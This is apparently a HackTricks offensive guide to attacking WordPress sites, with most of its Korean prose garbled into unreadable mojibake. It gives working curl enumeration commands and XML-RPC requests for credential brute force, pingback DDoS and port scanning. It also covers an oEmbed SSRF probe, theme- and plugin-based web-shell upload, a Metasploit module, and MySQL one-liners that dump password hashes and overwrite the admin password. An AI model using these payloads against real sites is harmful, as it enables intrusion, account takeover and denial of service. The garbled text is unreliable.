# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## ê¸°ë³¸ ì •ë³´

- **ì—…ë¡œë“œëœ** íŒŒì¼ì€ ë‹¤ìŒì— ì €ì¥ë©ë‹ˆë‹¤: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **í…Œë§ˆ íŒŒì¼ì€ /wp-content/themes/ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤,** ë”°ë¼ì„œ í…Œë§ˆì˜ ì¼ë¶€ phpë¥¼ ìˆ˜ì •í•˜ì—¬ RCEë¥¼ ì–»ìœ¼ë ¤ë©´ ì•„ë§ˆë„ í•´ë‹¹ ê²½ë¡œë¥¼ ì´ìš©í•˜ê²Œ ë©ë‹ˆë‹¤. ì˜ˆ: **theme twentytwelve**ë¥¼ ì‚¬ìš©í•˜ë©´ ë‹¤ìŒì—ì„œ **404.php** íŒŒì¼ì— **ì ‘ê·¼**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **ë‹¤ë¥¸ ìœ ìš©í•œ URL ì˜ˆ:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **wp-config.php**ì—ì„œ ë°ì´í„°ë² ì´ìŠ¤ì˜ ë£¨íŠ¸ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- í™•ì¸í•´ì•¼ í•  ê¸°ë³¸ ë¡œê·¸ì¸ ê²½ë¡œ: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **ì£¼ìš” WordPress íŒŒì¼**

- `index.php`
- `license.txt`ì—ëŠ” ì„¤ì¹˜ëœ WordPress ë²„ì „ê³¼ ê°™ì€ ìœ ìš©í•œ ì •ë³´ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤.
- `wp-activate.php`ëŠ” ìƒˆ WordPress ì‚¬ì´íŠ¸ ì„¤ì • ì‹œ ì´ë©”ì¼ í™œì„±í™” í”„ë¡œì„¸ìŠ¤ì— ì‚¬ìš©ë©ë‹ˆë‹¤.
- ë¡œê·¸ì¸ í´ë”(ìˆ¨ê¸°ê¸° ìœ„í•´ ì´ë¦„ì´ ë³€ê²½ë˜ì—ˆì„ ìˆ˜ ìˆìŒ):
  - `/wp-admin/login.php`
  - `/wp-admin/wp-login.php`
  - `/login.php`
  - `/wp-login.php`
- `xmlrpc.php`ëŠ” HTTPë¥¼ ì „ì†¡ ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ, XMLì„ ì¸ì½”ë”© ë©”ì»¤ë‹ˆì¦˜ìœ¼ë¡œ ì‚¬ìš©í•´ ë°ì´í„°ë¥¼ ì „ì†¡í•  ìˆ˜ ìˆê²Œ í•˜ëŠ” WordPressì˜ ê¸°ëŠ¥ì„ ë‚˜íƒ€ë‚´ëŠ” íŒŒì¼ì…ë‹ˆë‹¤. ì´ ìœ í˜•ì˜ í†µì‹ ì€ WordPressì˜ [REST API](https://developer.wordpress.org/rest-api/reference)ì— ì˜í•´ ëŒ€ì²´ë˜ì—ˆìŠµë‹ˆë‹¤.
- `wp-content` í´ë”ëŠ” í”ŒëŸ¬ê·¸ì¸ê³¼ í…Œë§ˆê°€ ì €ì¥ë˜ëŠ” ì£¼ìš” ë””ë ‰í„°ë¦¬ì…ë‹ˆë‹¤.
- `wp-content/uploads/`ëŠ” í”Œë«í¼ì— ì—…ë¡œë“œëœ ëª¨ë“  íŒŒì¼ì´ ì €ì¥ë˜ëŠ” ë””ë ‰í„°ë¦¬ì…ë‹ˆë‹¤.
- `wp-includes/`ëŠ” ì¸ì¦ì„œ, ê¸€ê¼´, JavaScript íŒŒì¼ ë° ìœ„ì ¯ê³¼ ê°™ì€ í•µì‹¬ íŒŒì¼ë“¤ì´ ì €ì¥ë˜ëŠ” ë””ë ‰í„°ë¦¬ì…ë‹ˆë‹¤.
- `wp-sitemap.xml` WordPress ë²„ì „ 5.5 ì´ìƒì—ì„œëŠ” ê³µê°œ í¬ìŠ¤íŠ¸ ë° ê³µê°œì ìœ¼ë¡œ ì¿¼ë¦¬ ê°€ëŠ¥í•œ í¬ìŠ¤íŠ¸ íƒ€ì…ê³¼ íƒì†Œë…¸ë¯¸ë¥¼ í¬í•¨í•œ sitemap XML íŒŒì¼ì„ ìƒì„±í•©ë‹ˆë‹¤.

**Post exploitation**

- `wp-config.php` íŒŒì¼ì—ëŠ” ë°ì´í„°ë² ì´ìŠ¤ ì´ë¦„, ë°ì´í„°ë² ì´ìŠ¤ í˜¸ìŠ¤íŠ¸, ì‚¬ìš©ìëª… ë° ë¹„ë°€ë²ˆí˜¸, ì¸ì¦ í‚¤ì™€ ì†”íŠ¸, ë°ì´í„°ë² ì´ìŠ¤ í…Œì´ë¸” ì ‘ë‘ì‚¬ ë“± WordPressê°€ ë°ì´í„°ë² ì´ìŠ¤ì— ì—°ê²°í•˜ëŠ” ë° í•„ìš”í•œ ì •ë³´ê°€ ë“¤ì–´ ìˆìŠµë‹ˆë‹¤. ì´ ì„¤ì • íŒŒì¼ì€ ë¬¸ì œ í•´ê²°ì— ìœ ìš©í•œ DEBUG ëª¨ë“œë¥¼ í™œì„±í™”í•˜ëŠ” ë°ì—ë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì‚¬ìš©ì ê¶Œí•œ

- **Administrator**
- **Editor**: ìì‹ ì˜ ë° ë‹¤ë¥¸ ì‚¬ëŒì˜ ê²Œì‹œë¬¼ì„ ê²Œì‹œí•˜ê³  ê´€ë¦¬í•©ë‹ˆë‹¤
- **Author**: ìì‹ ì˜ ê²Œì‹œë¬¼ì„ ê²Œì‹œí•˜ê³  ê´€ë¦¬í•©ë‹ˆë‹¤
- **Contributor**: ê²Œì‹œë¬¼ì„ ì‘ì„±í•˜ê³  ê´€ë¦¬í•  ìˆ˜ ìˆìœ¼ë‚˜ ê²Œì‹œí•  ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤
- **Subscriber**: ê²Œì‹œë¬¼ì„ ì—´ëŒí•˜ê³  ìì‹ ì˜ í”„ë¡œí•„ì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤

## **Passive Enumeration**

### **Get WordPress version**

`/license.txt` ë˜ëŠ” `/readme.html` íŒŒì¼ì„ ì°¾ì„ ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ì„¸ìš”.

í˜ì´ì§€ì˜ **source code** ë‚´ì—ì„œ (ì˜ˆ: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS ë§í¬ íŒŒì¼

![](<../../images/image (533).png>)

- JavaScript íŒŒì¼

![](<../../images/image (524).png>)

### í”ŒëŸ¬ê·¸ì¸ ì–»ê¸°
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### í…Œë§ˆ ê°€ì ¸ì˜¤ê¸°
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ì¼ë°˜ì ìœ¼ë¡œ ë²„ì „ ì¶”ì¶œí•˜ê¸°
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## ëŠ¥ë™ì  ì—´ê±°

### í”ŒëŸ¬ê·¸ì¸ ë° í…Œë§ˆ

ì•„ë§ˆ ëª¨ë“  í”ŒëŸ¬ê·¸ì¸ê³¼ í…Œë§ˆë¥¼ ì°¾ì„ ìˆ˜ëŠ” ì—†ì„ ê²ƒì…ë‹ˆë‹¤. ëª¨ë‘ ë°œê²¬í•˜ë ¤ë©´ **actively Brute Force a list of Plugins and Themes** í•´ì•¼ í•©ë‹ˆë‹¤(ë‹¤í–‰íˆë„ ì´ëŸ¬í•œ ëª©ë¡ì„ í¬í•¨í•œ ìë™í™” ë„êµ¬ë“¤ì´ ì¡´ì¬í•©ë‹ˆë‹¤).

### ì‚¬ìš©ì

- **ID Brute:** Brute Forcing ì‚¬ìš©ì IDë¥¼ í†µí•´ WordPress ì‚¬ì´íŠ¸ì˜ ìœ íš¨í•œ ì‚¬ìš©ìë¥¼ ì–»ìŠµë‹ˆë‹¤:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
ì‘ë‹µì´ **200** ë˜ëŠ” **30X**ì´ë©´ í•´ë‹¹ idê°€ **ìœ íš¨**í•˜ë‹¤ëŠ” ì˜ë¯¸ì…ë‹ˆë‹¤. ì‘ë‹µì´ **400**ì´ë©´ idê°€ **ë¬´íš¨**ì…ë‹ˆë‹¤.

- **wp-json:** ì¿¼ë¦¬í•˜ì—¬ ì‚¬ìš©ìì— ëŒ€í•œ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
ì‚¬ìš©ìì— ëŒ€í•œ ì¼ë¶€ ì •ë³´ë¥¼ ë“œëŸ¬ë‚¼ ìˆ˜ ìˆëŠ” ë˜ ë‹¤ë¥¸ `/wp-json/` endpointëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
ì´ ì—”ë“œí¬ì¸íŠ¸ëŠ” ê²Œì‹œë¬¼ì„ ì‘ì„±í•œ ì‚¬ìš©ìë§Œ ë…¸ì¶œí•©ë‹ˆë‹¤. **ì´ ê¸°ëŠ¥ì„ í™œì„±í™”í•œ ì‚¬ìš©ìì— ëŒ€í•œ ì •ë³´ë§Œ ì œê³µë©ë‹ˆë‹¤**.

ë˜í•œ **/wp-json/wp/v2/pages**ëŠ” IP ì£¼ì†Œë¥¼ leakí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **Login username enumeration**: **`/wp-login.php`**ì— ë¡œê·¸ì¸í•  ë•Œ **ë©”ì‹œì§€**ê°€ **ë‹¤ë¥´ê²Œ** í‘œì‹œë˜ì–´ **ì‚¬ìš©ì ì´ë¦„ì´ ì¡´ì¬í•˜ëŠ”ì§€ ì—¬ë¶€**ë¥¼ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### XML-RPC

`xml-rpc.php`ê°€ í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©´ credentials brute-forceë¥¼ ìˆ˜í–‰í•˜ê±°ë‚˜ ë‹¤ë¥¸ ë¦¬ì†ŒìŠ¤ì— DoS ê³µê²©ì„ ì‹œì‘í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. (ì˜ˆ: ì´ ê³¼ì •ì„ ìë™í™”í•˜ë ¤ë©´[ using this](https://github.com/relarizky/wpxploit)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).

í™œì„±í™” ì—¬ë¶€ë¥¼ í™•ì¸í•˜ë ¤ë©´ _**/xmlrpc.php**_ì— ì ‘ì†í•˜ì—¬ ë‹¤ìŒ ìš”ì²­ì„ ì „ì†¡í•´ ë³´ì‹­ì‹œì˜¤:

**í™•ì¸**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ë˜ëŠ” **`metaWeblog.getUsersBlogs`**ëŠ” credentialsë¥¼ brute-forceí•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë©”ì„œë“œ ì¤‘ ì¼ë¶€ì…ë‹ˆë‹¤. í•´ë‹¹ ë©”ì„œë“œë“¤ì„ ì°¾ì„ ìˆ˜ ìˆë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì€ ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
200 ì½”ë“œ ì‘ë‹µ ë‚´ë¶€ì— _"Incorrect username or password"_ ë©”ì‹œì§€ëŠ” ìê²© ì¦ëª…ì´ ìœ íš¨í•˜ì§€ ì•Šì„ ê²½ìš° í‘œì‹œë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

ì˜¬ë°”ë¥¸ ìê²© ì¦ëª…ì„ ì‚¬ìš©í•˜ë©´ íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‘ë‹µì—ì„œ ê²½ë¡œê°€ í‘œì‹œë©ë‹ˆë‹¤ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
ë˜í•œ **faster way**ê°€ ìˆëŠ”ë°, ë™ì¼í•œ ìš”ì²­ìœ¼ë¡œ ì—¬ëŸ¬ credentialsë¥¼ ì‹œë„í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— **`system.multicall`**ì„ ì‚¬ìš©í•´ brute-force credentialsë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

ì´ ë°©ë²•ì€ ì‚¬ëŒìš©ì´ ì•„ë‹ˆë¼ í”„ë¡œê·¸ë¨ìš©ìœ¼ë¡œ ë§Œë“¤ì–´ì¡Œê³  ì˜¤ë˜ëœ ë°©ì‹ì´ê¸° ë•Œë¬¸ì— 2FAë¥¼ ì§€ì›í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ìœ íš¨í•œ credsëŠ” ê°€ì§€ê³  ìˆì§€ë§Œ ì£¼ìš” ì§„ì…ì ì´ 2FAë¡œ ë³´í˜¸ë˜ì–´ ìˆë‹¤ë©´, **you might be able to abuse xmlrpc.php to login with those creds bypassing 2FA**. ì½˜ì†”ì—ì„œ í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ëŠ” ì—†ì§€ë§Œ, Ippsecê°€ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)ì—ì„œ ì„¤ëª…í•œ ê²ƒì²˜ëŸ¼ ì—¬ì „íˆ RCEì— ë„ë‹¬í•  ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

**DDoS or port scanning**

ëª©ë¡ì—ì„œ _**pingback.ping**_ ë©”ì„œë“œë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤ë©´, Wordpressê°€ ì„ì˜ì˜ í˜¸ìŠ¤íŠ¸/í¬íŠ¸ë¡œ ìš”ì²­ì„ ë³´ë‚´ê²Œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ê²ƒì„ ì´ìš©í•˜ë©´ **thousands**ì˜ Wordpress **sites**ì— í•˜ë‚˜ì˜ **location**ì— ì ‘ê·¼í•˜ë„ë¡ ìš”ì²­í•˜ê²Œ í•¨ìœ¼ë¡œì¨ í•´ë‹¹ ìœ„ì¹˜ì— **DDoS**ë¥¼ ì¼ìœ¼í‚¤ê±°ë‚˜, íŠ¹ì • í¬íŠ¸ë¥¼ ì§€ì •í•˜ì—¬ **Wordpress**ë¥¼ lo **scan**í•˜ë„ë¡ ë§Œë“¤ì–´ ë‚´ë¶€ **network**ë¥¼ ìŠ¤ìº”í•˜ê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (í¬íŠ¸ëŠ” ì›í•˜ëŠ” ëŒ€ë¡œ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

ê°’ì´ **0** (17)ë³´ë‹¤ **í°** **faultCode**ë¥¼ ë°›ìœ¼ë©´ í¬íŠ¸ê°€ ì—´ë ¤ ìˆë‹¤ëŠ” ëœ»ì…ë‹ˆë‹¤.

ì´ì „ ì„¹ì…˜ì—ì„œ **`system.multicall`**ì˜ ì‚¬ìš©ë²•ì„ ì‚´í´ë³´ë©´ ì´ ë©”ì„œë“œë¥¼ ì•…ìš©í•´ DDoSë¥¼ ì¼ìœ¼í‚¤ëŠ” ë°©ë²•ì„ ë°°ìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

ì´ íŒŒì¼ì€ ë³´í†µ Wordpress ì‚¬ì´íŠ¸ì˜ ë£¨íŠ¸ì— ì¡´ì¬í•©ë‹ˆë‹¤: **`/wp-cron.php`**\
ì´ íŒŒì¼ì— **accessed**ë˜ë©´ **heavy** MySQL **query**ê°€ ìˆ˜í–‰ë˜ì–´ **attackers**ê°€ **DoS**ë¥¼ **cause**í•˜ëŠ” ë° ì´ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë˜í•œ ê¸°ë³¸ì ìœ¼ë¡œ `wp-cron.php`ëŠ” ëª¨ë“  í˜ì´ì§€ ë¡œë“œ(í´ë¼ì´ì–¸íŠ¸ê°€ Wordpress í˜ì´ì§€ë¥¼ ìš”ì²­í•  ë•Œë§ˆë‹¤) ì‹œ í˜¸ì¶œë˜ë¯€ë¡œ, íŠ¸ë˜í”½ì´ ë§ì€ ì‚¬ì´íŠ¸ì—ì„œëŠ” ë¬¸ì œê°€ ë°œìƒ(DoS)í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Wp-Cronì„ ë¹„í™œì„±í™”í•˜ê³  í˜¸ìŠ¤íŠ¸ ë‚´ì—ì„œ ì‹¤ì œ cronjobì„ ë§Œë“¤ì–´ í•„ìš”í•œ ì‘ì—…ì„ ì •ê¸°ì ìœ¼ë¡œ ìˆ˜í–‰í•˜ë„ë¡ í•˜ëŠ” ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤(ë¬¸ì œë¥¼ ì¼ìœ¼í‚¤ì§€ ì•Šë„ë¡).

### /wp-json/oembed/1.0/proxy - SSRF

ë‹¤ìŒì— ì ‘ê·¼ì„ ì‹œë„í•´ë³´ì„¸ìš”: _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ ê·¸ë¦¬ê³  Worpress ì‚¬ì´íŠ¸ê°€ ë‹¹ì‹ ì—ê²Œ ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

ì´ ë„êµ¬ëŠ” **methodName: pingback.ping**ì´ ìˆëŠ”ì§€ì™€ **/wp-json/oembed/1.0/proxy** ê²½ë¡œê°€ ì¡´ì¬í•˜ëŠ”ì§€ë¥¼ í™•ì¸í•˜ê³ , ì¡´ì¬í•˜ë©´ ì´ë¥¼ ì´ìš©í•´ ìµìŠ¤í”Œë¡œì‡ì„ ì‹œë„í•©ë‹ˆë‹¤.

## ìë™ ë„êµ¬
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## í•œ ë¹„íŠ¸ë¥¼ ë®ì–´ì¨ì„œ ì ‘ê·¼í•˜ê¸°

ì‹¤ì œ ê³µê²©ì´ë¼ê¸°ë³´ë‹¤ëŠ” í˜¸ê¸°ì‹¬ì— ê°€ê¹Œìš´ ì‚¬ë¡€ë‹¤. IN the CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man)ì—ì„œëŠ” ì–´ë–¤ wordpress íŒŒì¼ì˜ 1ë¹„íŠ¸ë¥¼ ë’¤ì§‘ì„ ìˆ˜ ìˆì—ˆë‹¤. ê·¸ë˜ì„œ íŒŒì¼ `/var/www/html/wp-includes/user.php`ì˜ ìœ„ì¹˜ `5389` ë¹„íŠ¸ë¥¼ ë’¤ì§‘ì–´ NOP the NOT (`!`) ì—°ì‚°ì„ ë¬´íš¨í™”í•  ìˆ˜ ìˆë‹¤.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**ì‚¬ìš© ì¤‘ì¸ í…Œë§ˆì˜ php ìˆ˜ì • (ê´€ë¦¬ì ìê²© ì¦ëª… í•„ìš”)**

Appearance â†’ Theme Editor â†’ 404 Template (ì˜¤ë¥¸ìª½ì—)

Change the content for a php shell:

![](<../../images/image (384).png>)

ì—…ë°ì´íŠ¸ëœ í˜ì´ì§€ì— ì–´ë–»ê²Œ ì ‘ê·¼í•˜ëŠ”ì§€ ì¸í„°ë„·ì—ì„œ ê²€ìƒ‰í•˜ì„¸ìš”. ì´ ê²½ìš°ì—ëŠ” ë‹¤ìŒì— ì ‘ê·¼í•´ì•¼ í•©ë‹ˆë‹¤: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
Create your php backdoor using for example:

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:

![](<../../images/image (462).png>)

Access it and you will see the URL to execute the reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

ì´ ë°©ë²•ì€ ì·¨ì•½í•œ ê²ƒìœ¼ë¡œ ì•Œë ¤ì§„ ì•…ì„± pluginì„ ì„¤ì¹˜í•˜ì—¬ web shellì„ íšë“í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì´ ê³¼ì •ì€ WordPress dashboardë¥¼ í†µí•´ ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤:

1. **Plugin Acquisition**: The plugin is obtained from a source like Exploit DB like [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Navigate to the WordPress dashboard, then go to `Dashboard > Plugins > Upload Plugin`.
- Upload the zip file of the downloaded plugin.
3. **Plugin Activation**: Once the plugin is successfully installed, it must be activated through the dashboard.
4. **Exploitation**:
- With the plugin "reflex-gallery" installed and activated, it can be exploited as it is known to be vulnerable.
- The Metasploit framework provides an exploit for this vulnerability. By loading the appropriate module and executing specific commands, a meterpreter session can be established, granting unauthorized access to the site.
- It's noted that this is just one of the many methods to exploit a WordPress site.

The content includes visual aids depicting the steps in the WordPress dashboard for installing and activating the plugin. However, it's important to note that exploiting vulnerabilities in this manner is illegal and unethical without proper authorization. This information should be used responsibly and only in a legal context, such as penetration testing with explicit permission.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Creates an user in WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Upload your custom plugin (backdoor) to WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edit a Built-In Plugins in WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edit a Built-In Themes in WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits for Third-Party WordPress Plugins/Themes.

## Post Exploitation

ì‚¬ìš©ì ì´ë¦„ê³¼ ë¹„ë°€ë²ˆí˜¸ ì¶”ì¶œ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ê´€ë¦¬ì ë¹„ë°€ë²ˆí˜¸ ë³€ê²½:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress í”ŒëŸ¬ê·¸ì¸ Pentest

### ê³µê²© í‘œë©´

Wordpress í”ŒëŸ¬ê·¸ì¸ì´ ê¸°ëŠ¥ì„ ì–´ë–»ê²Œ ë…¸ì¶œí•˜ëŠ”ì§€ëŠ” í•´ë‹¹ ê¸°ëŠ¥ì˜ ì·¨ì•½ì ì„ ì°¾ëŠ” ë° í•µì‹¬ì ì´ë‹¤. í”ŒëŸ¬ê·¸ì¸ì´ ê¸°ëŠ¥ì„ ë…¸ì¶œí•˜ëŠ” ë°©ì‹ì€ ì•„ë˜ í•­ëª©ë“¤ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©°, ì·¨ì•½í•œ í”ŒëŸ¬ê·¸ì¸ ì˜ˆì‹œëŠ” [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/)ë¥¼ ì°¸ê³ í•˜ë¼.

- **`wp_ajax`**

í”ŒëŸ¬ê·¸ì¸ì´ ê¸°ëŠ¥ì„ ì‚¬ìš©ìì—ê²Œ ë…¸ì¶œí•˜ëŠ” ë°©ë²• ì¤‘ í•˜ë‚˜ëŠ” AJAX í•¸ë“¤ëŸ¬ë¥¼ í†µí•œ ê²ƒì´ë‹¤. ì´ëŸ¬í•œ í•¸ë“¤ëŸ¬ì—ëŠ” ë…¼ë¦¬ì  ê²°í•¨, authorization, ë˜ëŠ” authentication ë²„ê·¸ê°€ í¬í•¨ë  ìˆ˜ ìˆë‹¤. ê²Œë‹¤ê°€ ì´ë“¤ í•¨ìˆ˜ëŠ” ì¸ì¦ê³¼ ê¶Œí•œ ë¶€ì—¬ë¥¼ ëª¨ë‘ WordPress nonceì˜ ì¡´ì¬ì— ê¸°ë°˜í•˜ëŠ” ê²½ìš°ê°€ í”í•œë°, í•´ë‹¹ nonceëŠ” **Wordpress ì¸ìŠ¤í„´ìŠ¤ì— ì¸ì¦ëœ ëª¨ë“  ì‚¬ìš©ìê°€ ê°€ì§ˆ ìˆ˜ ìˆë‹¤**(ì—­í• ê³¼ ë¬´ê´€í•˜ê²Œ).

These are the functions that can be used to expose a function in a plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv`ì˜ ì‚¬ìš©ì€ í•´ë‹¹ ì—”ë“œí¬ì¸íŠ¸ë¥¼ ëª¨ë“  ì‚¬ìš©ì(ì‹¬ì§€ì–´ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ì)ë„ ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ ë§Œë“­ë‹ˆë‹¤.**

> [!CAUTION]
